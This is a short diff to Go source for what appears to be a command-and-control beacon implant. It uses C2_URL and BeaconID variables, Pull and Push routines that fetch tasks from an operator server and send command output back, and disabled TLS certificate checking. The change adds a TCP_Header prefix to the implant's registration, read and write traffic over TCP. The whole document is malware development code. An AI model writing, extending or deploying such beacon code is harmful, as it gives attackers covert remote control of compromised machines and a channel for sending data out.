@@ -22,14 +22,14 @@ var (
 				return url.Parse(ProxyURL)
 			},
 			TLSHandshakeTimeout: 10*time.Second,
-			TLSClientConfig:	 &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 		},
 	}
 )
 
 func init() {
 	if strings.HasPrefix(C2_URL, "tcp") {
-		TCP(JoinBytes(_IntToByte(4, len(MetaByte)+4), _IntToByte(4, BeaconID), MetaByte))
+		TCP(JoinBytes([]byte(TCP_Header), _IntToByte(4, len(MetaByte)+4), _IntToByte(4, BeaconID), MetaByte))
 	} else {
 		SetProperty(PullInfo, "MetaData", MetaByte)
 		SetProperty(PushInfo, "BeaconID", []byte(strconv.Itoa(BeaconID)))
@@ -86,6 +86,7 @@ func Pull() *bytes.Buffer {
 		return ParseBytes(GetOutput(Data))
 	}
 	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
+		ReadFrom(Conn.(net.Conn), len(TCP_Header))
 		Len := _ByteToInt(ReadFrom(Conn.(net.Conn), 4))
 		return ParseBytes(ReadFrom(Conn.(net.Conn), Len))
 	}
@@ -96,7 +97,7 @@ func Push() {
 	time.Sleep(200*time.Millisecond)
 	WriteLock(func() {
 		if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
-			_, err := Conn.(net.Conn).Write(_IntToByte(4, Buffer.Len()))
+			_, err := Conn.(net.Conn).Write(JoinBytes([]byte(TCP_Header), _IntToByte(4, Buffer.Len())))
 			if err != nil { Tunnel.Delete(BeaconID) }
 			if Buffer.Len() > 0 {
 				io.Copy(Conn.(net.Conn), &Buffer)
